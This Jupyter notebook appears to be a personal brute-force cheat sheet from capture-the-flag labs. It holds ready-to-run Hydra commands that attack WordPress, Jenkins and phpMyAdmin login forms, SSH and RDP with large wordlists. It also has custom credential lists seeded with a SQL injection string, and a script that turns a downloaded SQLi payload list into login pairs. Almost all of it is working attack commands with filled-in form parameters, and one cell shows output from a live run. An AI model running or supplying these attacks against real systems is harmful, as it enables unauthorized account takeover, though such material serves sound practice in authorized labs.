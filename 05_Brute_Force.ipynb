{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "1be5ed90-b114-4a39-9dfa-1a85734b999f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: TARGET=10.10.167.66\n"
     ]
    }
   ],
   "source": [
    "%env TARGET=10.10.167.66"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "5dd253ad-85ee-43d6-a1c3-70d5bca4f6c8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: PL=SecLists/Passwords/probable-v2-top1575.txt\n",
      "env: PLRY=/usr/share/wordlists/rockyou.txt\n",
      "env: UL=SecLists/Usernames/Names/names.txt\n",
      "env: UL_S=/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt\n",
      "env: USER=user\n"
     ]
    }
   ],
   "source": [
    "# %env PL=/usr/share/wordlists/SecLists/Passwords/probable-v2-top207.txt\n",
    "%env PL=SecLists/Passwords/probable-v2-top1575.txt\n",
    "%env PLRY=/usr/share/wordlists/rockyou.txt\n",
    "\n",
    "%env UL=SecLists/Usernames/Names/names.txt\n",
    "%env UL_S=/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt\n",
    "\n",
    "%env USER=user"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "84169507-1a20-48af-ad31-298ef92206e1",
   "metadata": {
    "tags": []
   },
   "source": [
    "# Wordpress:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "7e6e1593-d90f-41a4-b6e6-7a1f8ecd2af2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: DIR=/wp-login.php\n",
      "env: BODY=log=log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.167.66%2Fwp-admin%2F&testcookie=1\n",
      "env: COOKIE=H=Cookie: wordpress_test_cookie=WP+Cookie+check\n",
      "env: COND=Unknown username\n"
     ]
    }
   ],
   "source": [
    "%env DIR=/wp-login.php\n",
    "%env BODY=log=log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.167.66%2Fwp-admin%2F&testcookie=1\n",
    "%env COOKIE=H=Cookie: wordpress_test_cookie=WP+Cookie+check\n",
    "%env COND=Unknown username"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "a1bf1bf7-e934-4003-a604-2629d6b25dd4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: URL=10.10.167.66\n"
     ]
    }
   ],
   "source": [
    "%env URL=10.10.167.66"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "73328f38-ac5e-4ab4-b00f-c6be04715950",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n",
      "\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-06 23:08:13\n",
      "[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore\n",
      "[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:1/p:858235), ~53640 tries per task\n",
      "[DATA] attacking http-post-form://10.10.167.66:80/wp-login.php:log=log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.167.66%2Fwp-admin%2F&testcookie=1:Unknown username\n",
      "[STATUS] 16.00 tries/min, 16 tries in 00:01h, 858219 to do in 893:59h, 16 active\n"
     ]
    }
   ],
   "source": [
    "!hydra -I -l user -P fsociety.txt $URL http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a56b7efc-e7e0-464f-b72c-5a2aac865664",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -l root -P fsociety.txt $URL http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b63ad53c-2189-491a-bb11-720277d32c20",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -l \"mr. robot\" -P fsociety.txt $URL http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1ab6bed5-4b11-4988-853d-fd9162c21b2d",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -l elliot -P fsociety.txt $URL http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "16f6456a-3399-41dd-b626-b4d4c326c6f7",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -L $UL_S -P fsociety.txt $URL http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a625eac1-4249-479f-bcca-33b12679e928",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -l user -P $PL $URL http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f03910d0-fd70-4083-8113-9a93943df72c",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -L $UL -p password $URL http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3f301df4-3ef7-4ed0-a449-8d337cb19838",
   "metadata": {
    "jp-MarkdownHeadingCollapsed": true,
    "tags": []
   },
   "source": [
    "# SSH:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cf9b6b59-47f6-41c1-952c-cfac1f946cc9",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "!hydra -I -l $USER -P $PL $TARGET ssh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6881571d-6dd1-40e7-b536-8d2effaa16ce",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -L $UL_S -P $PL $TARGET ssh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0dd147e4-7357-434c-b376-66609cef02ff",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -L $UL -P $PL $TARGET ssh"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1e1d03f1-c2ae-492c-8549-1208fcff69d3",
   "metadata": {
    "tags": []
   },
   "source": [
    "# HTTP POST:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8b7b8a41-d6e7-4cf4-b57c-07e1457569ed",
   "metadata": {},
   "outputs": [],
   "source": [
    "# %env PL=/usr/share/wordlists/SecLists/Passwords/probable-v2-top207.txt\n",
    "%env PL=SecLists/Passwords/probable-v2-top1575.txt\n",
    "%env PLRY=/usr/share/wordlists/rockyou.txt\n",
    "\n",
    "%env UL=SecLists/Usernames/Names/names.txt\n",
    "%env UL_S=/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7484d520-2594-4ee1-9672-d5d6c22ab89f",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%writefile my_usernames.txt\n",
    "\n",
    "admin\n",
    "administrator\n",
    "root\n",
    "' OR 1 -- -\n",
    "\n",
    "# special:\n",
    "# service name\n",
    "# look for defaults online\n",
    "\n",
    "# others:\n",
    "    \n",
    "aubreanna\n",
    "jenkins"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ff614fe8-37a3-48ca-89e0-2e79f760d8b5",
   "metadata": {},
   "source": [
    "Machine name, challenge name, target name, website name, admin:admin, admin:password, admin:123456\n",
    "\n",
    "Vary caps: password, PASSWORD, Password"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f2a645fe-1c0b-4c99-b2c1-6465211c2fec",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%writefile my_passwords.txt\n",
    "\n",
    "admin\n",
    "root\n",
    "password\n",
    "password123\n",
    "password321\n",
    "123456\n",
    "' OR 1 -- -\n",
    "\n",
    "# special:\n",
    "# username\n",
    "# service name\n",
    "# none\n",
    "\n",
    "\n",
    "# defaults:\n",
    "\n",
    "# others:\n",
    "\n",
    "internal\n",
    "aubreanna\n",
    "bubb13guM!@#123\n",
    "my2boys\n",
    "jenkins\n",
    "wordpress123\n",
    "jenkins123"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "89b4fee9-fb16-4809-8d5f-b44674f42039",
   "metadata": {
    "jp-MarkdownHeadingCollapsed": true,
    "tags": []
   },
   "source": [
    "## Jenkins:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9119a8f6-c2c4-4d7b-907f-df07eb26ed30",
   "metadata": {},
   "outputs": [],
   "source": [
    "%env TARGET=127.0.0.1\n",
    "%env PORT=444"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0a41e375-f575-4dc6-ab8b-4c220b4d3401",
   "metadata": {},
   "outputs": [],
   "source": [
    "%env DIR=/j_acegi_security_check\n",
    "%env BODY=j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in\n",
    "# %env COOKIE=H=Cookie: JSESSIONID.eac25c2d=node0f05wmgvaznppx0gmi6ii0cy42.node0\n",
    "%env COND=Invalid username or"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bba369bf-c0fa-48b0-9d26-159ab4dfe7dd",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -l admin -s $PORT -P my_passwords.txt $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c567108e-1daa-461b-97f2-1c621612bc77",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -L my_usernames.txt -s $PORT -P my_passwords.txt $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b5ae0b29-b318-424e-9992-ac85af10d6d3",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -L my_usernames.txt -s $PORT -P $PL $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9931bd17-c6c3-4a4e-ae23-a68d45af1ce4",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "!hydra -t 64 -I -L my_usernames.txt -s $PORT -P $PLRY $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0dfd2bbf-6b4a-4366-835b-375e7242c32c",
   "metadata": {
    "tags": []
   },
   "source": [
    "## Admin:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "26fdb2c4-afed-4a9b-a40d-633d45746a45",
   "metadata": {},
   "outputs": [],
   "source": [
    "%env TARGET=internal.thm"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "814dd342-b8d5-4c60-bc44-53a8414443da",
   "metadata": {},
   "outputs": [],
   "source": [
    "%env DIR=/phpmyadmin/index.php\n",
    "%env BODY=pma_username=^USER^&pma_password=^PASS^\n",
    "%env COND=Access denied|AllowNoPassword|Language"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0e643f14-3597-4efd-8f8e-c3dafe93b0ce",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -L my_usernames.txt -P my_passwords.txt $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fe0378ad-18c0-469c-9d91-1cd9a0a15eee",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -l root -P $PL $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b3126d96-6039-477c-a767-918313d3ca6b",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -l admin -P $PL $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "942055bc-7de3-440d-84c8-69837a9bc399",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -l root -P $PLRY $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "28718d33-90e5-4455-9b9f-e1e750d7fe6e",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1a29c4c4-81cb-444f-8c8d-bf2e756586ad",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -L my_usernames.txt -P $PLRY $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "90a888eb-a6f9-407e-95a9-6ebd46a36362",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -L $UL -P $PL $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9bd7f46c-5eb6-4388-a3ae-0eb44f695722",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -L $UL_S -P $PLRY $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "36cbc35a-3e19-41c0-8b29-03b02d2023f2",
   "metadata": {
    "tags": []
   },
   "source": [
    "## HTTP Post SQLi:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9b18e78b-f369-413b-95b1-cf6078c7141b",
   "metadata": {},
   "outputs": [],
   "source": [
    "!wget https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/detect/xPlatform/xplatform.txt\n",
    "%env SQLWL=xplatform.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "72b1c142-ff27-48da-8c79-96aadf5dd1d1",
   "metadata": {
    "scrolled": true,
    "tags": []
   },
   "outputs": [],
   "source": [
    "!cat xplatform.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f55e8f32-a7b2-46e2-92a5-1011d4b0b912",
   "metadata": {},
   "outputs": [],
   "source": [
    "lines = []\n",
    "with open('xplatform.txt', 'r') as f:\n",
    "    for line in f.readlines():\n",
    "        passwd=line.strip()\n",
    "        to_add = passwd+\":\"+passwd\n",
    "        if '031003000270000' in to_add:\n",
    "            continue\n",
    "        lines.append(to_add)\n",
    "        \n",
    "with open('pairs.txt', 'w') as f:\n",
    "    f.write(\"\\n\".join(lines))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "34c29af0-c7fd-4f9d-bc7e-e4a23ce6076b",
   "metadata": {},
   "outputs": [],
   "source": [
    "!echo $TARGET$DIR:$BODY:$COND"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d1fcf7f0-e003-483d-bf3c-aaecc1bfbbe2",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -vv -I -C pairs.txt $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "04b8a04a-3c0f-489e-9d62-0957a2b311fc",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -V -f -L $USERLIST -P $WORDLIST rdp://$TARGET"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "95b92508-8266-4198-bab5-d2744c11001f",
   "metadata": {
    "tags": []
   },
   "source": [
    "# RDP:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "973d624a-a66c-4650-8529-767ddba95199",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -V -f -l $UL_S -P $PL rdp://$TARGET"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cd7ec17e-042d-45f4-8737-b8a5a17f03f1",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "!hydra -V -f -l $UL_S -P $PLRY rdp://$TARGET"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d1cbd2e6-f27c-4468-a77c-6fd4b50e3c4e",
   "metadata": {},
   "outputs": [],
   "source": [
    "!echo hydra -I -l administrator -P $PL rdp://$TARGET/RELEVANT"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "765688ba-d609-4030-9da4-14f58575ae70",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -L $UL -P $PL $TARGET rdp"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
